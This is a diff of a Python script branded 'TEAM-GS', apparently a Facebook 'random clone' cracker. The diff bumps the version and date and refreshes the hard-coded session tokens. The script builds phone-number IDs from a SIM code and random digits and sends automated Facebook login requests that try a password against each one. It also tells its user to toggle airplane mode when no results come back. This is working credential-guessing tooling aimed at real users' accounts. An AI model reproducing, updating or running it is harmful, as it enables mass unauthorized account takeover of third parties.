@@ -227,7 +227,7 @@ def ____banner____():
     | OWNER   {Y}: {W}TEAM-GS               |
     | TOOLS  {Y} : {W}RANDOM                |
     | W.NUMB  {Y}: {W}80000XXXXX            |
-    | VERSION{Y} : {W}V{Y}-{orang}2.2{W}                 |
+    | VERSION{Y} : {W}V{Y}-{orang}2.3{W}                 |
     +---------------------------------+""")
 ##-------------[ DEF RANDOM CLONE]-------------##
 def ___random_main___():
@@ -314,7 +314,7 @@ def ___random_main___():
         ____banner____()
         print(f'    {W}[{Y}✓{W}] TOTAL IDS {W}: {Y}{limit}{W}/{W}SIM CODE {rad} : {W}({G}{code}{W})')
         print(f'    {W}[{Y}✓{W}] IF NO RESULT {W}[{G}AIRPLANE MODE{W}] {G}ON{W}/{rad}OFF')
-        print(f'    {W}[{Y}✓{W}] SPEED {W}:[{G} {speed} {W}] {G}update date / time {W}- {rad} 19 may 2026 / 07:00')
+        print(f'    {W}[{Y}✓{W}] SPEED {W}:[{G} {speed} {W}] {G}update date / time {W}- {rad} 05 Jul 2026 / 11:00')
         linex()
         for love in user:
             ids = code + love
@@ -367,14 +367,14 @@ def _TEAM_RANDOM_M1(ids):
             '__user': '0',
             '__a': '1',
             '__req': '8',
-            '__hs': '20594.BP:wbloks_caa_pkg.2.0...0',
+            '__hs': '20639.BP:wbloks_caa_pkg.2.0...0',
             'dpr': '3',
             '__ccg': 'EXCELLENT',
             '__rev': str(random.randint(1000000000,1999999999)),
-            '__s': 'spivly:596t94:pg20in',
+            '__s': 'ihdj0f:sz0puj:ugar6y',
             '__hsi': str(int(time.time() * 10000000)),
             '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x67o1g8hw23E52q1ew2io0D24o1MUaE1Do1u81x82ewnE3fwww5NyE25w8W0Lo6-1CwOw5jw4JwzK0zo3jwea',
-            'fb_dtsg': 'NAfyDlkC5kkynIm4wIftE5emiKW6m1t1US8LMi9IaO9EX7qxRcA37fg:0:0',
+            'fb_dtsg': 'NAfxN9k_hmFG42EZYE4Qmpc4faqEiuV_FjjER8nNJtK7o3FXucpmKRQ:0:0',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
             'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1), 
             'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"xm00dg:63\\",\\"password_text_input_id\\":\\"xm00dg:64\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_aymh\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"two_step_login_type\\":\\"one_step_login\\",\\"is_vanilla_password_page_empty_password\\":0,\\"left_nav_button_action\\":\\"NONE\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"203233584400366\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"cloud_trust_token\\":null,\\"block_store_machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"contact_point\\":\\"'+ids+'\\",\\"password\\":\\"#PWD_BROWSER:0:'+str(int(time.time()))+':'+pas+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"aymh_accounts\\":[{\\"id\\":\\"\\",\\"profiles\\":{\\"id\\":{\\"user_id\\":\\"\\",\\"name\\":\\"\\",\\"profile_picture_url\\":\\"\\",\\"small_profile_picture_url\\":null,\\"notification_count\\":0,\\"credential_type\\":\\"none\\",\\"token\\":\\"\\",\\"last_access_time\\":0,\\"is_derived\\":0,\\"username\\":\\"\\",\\"password\\":\\"\\",\\"has_smartlock\\":0,\\"account_center_id\\":\\"\\",\\"account_source\\":\\"\\",\\"credentials\\":[],\\"nta_eligibility_reason\\":null,\\"from_accurate_privacy_result\\":0,\\"dbln_validated\\":0}}}],\\"network_bssid\\":null,\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}',
